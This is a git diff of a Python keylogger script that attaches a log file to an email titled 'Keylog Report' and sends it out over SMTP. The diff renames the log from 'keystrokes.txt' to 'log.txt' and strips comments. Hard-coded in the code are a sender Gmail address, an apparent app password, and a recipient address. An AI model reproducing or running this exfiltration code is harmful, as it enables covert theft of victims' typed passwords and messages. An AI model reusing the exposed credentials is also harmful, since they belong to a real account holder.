@@ -5,9 +5,8 @@ from email.mime.base import MIMEBase
 from email import encoders
 import os
 
-log_file = "keystrokes.txt"
+log_file = "log.txt"
 
-# Email configuration - Replace these with your actual details
 sender_email = "jrbotics.eshwarg@gmail.com"  
 sender_password = "ltmb cfeo vbth llux"  
 recipient_email = "eshwarg1432@gmail.com"  
@@ -24,7 +23,6 @@ def send_email():
     msg['To'] = recipient_email
     msg['Subject'] = "Keylog Report"
     
-    # Attach the log file
     try:
         with open(log_file, "rb") as attachment:
             part = MIMEBase('application', 'octet-stream')
@@ -37,7 +35,6 @@ def send_email():
         )
         msg.attach(part)
         
-        # Send email
         server = smtplib.SMTP(smtp_server, smtp_port)
         server.starttls()
         server.login(sender_email, sender_password)
